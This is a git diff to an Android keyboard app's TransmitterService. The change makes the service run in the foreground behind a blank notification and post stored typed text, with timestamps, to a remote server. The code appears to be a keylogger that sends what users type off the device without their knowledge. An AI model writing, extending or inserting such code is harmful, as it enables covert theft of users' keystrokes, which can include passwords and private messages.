@@ -2,6 +2,7 @@ package com.example.ruslanio.keyboard;
 
 import android.annotation.SuppressLint;
 import android.app.IntentService;
+import android.app.Notification;
 import android.app.Service;
 import android.content.ContentValues;
 import android.content.Intent;
@@ -31,7 +32,8 @@ public class TransmitterService extends IntentService {
 
     private DBHelper mDBHelper;
     private ApiManager mApiManager;
-    private boolean mIsRunning;
+    private boolean mIsRunning = true;
+    public static final int NOTIFICATION_ID = 13;
 
     public TransmitterService() {
         super("KeyService");
@@ -40,6 +42,7 @@ public class TransmitterService extends IntentService {
     @Override
     public void onCreate() {
         super.onCreate();
+        startForeground(NOTIFICATION_ID, new Notification());
         System.out.println("onCreate()");
         mDBHelper = new DBHelper(getApplicationContext());
         mApiManager = ApiManager.getInstance();
@@ -86,9 +89,9 @@ public class TransmitterService extends IntentService {
                         contentValues.put(DBHelper.TextEntityTable.TEXT_ENTITY_STATUS, DBHelper.STATUS_SERVER);
 
 
-                        if (currentText.equals("")) {
-//                        AddDataRequestBody requestBody = new AddDataRequestBody(currentText);
-                            Call<EmptyResult> call = mApiManager.postData(currentText);
+                        if (!currentText.isEmpty() && currentText != null && !currentText.equals(" ")) {
+                            AddDataRequestBody requestBody = new AddDataRequestBody(currentText, currentDate);
+                            Call<Void> call = mApiManager.postData(requestBody);
                             Response response = call.execute();
                             if (response.isSuccessful()) {
 
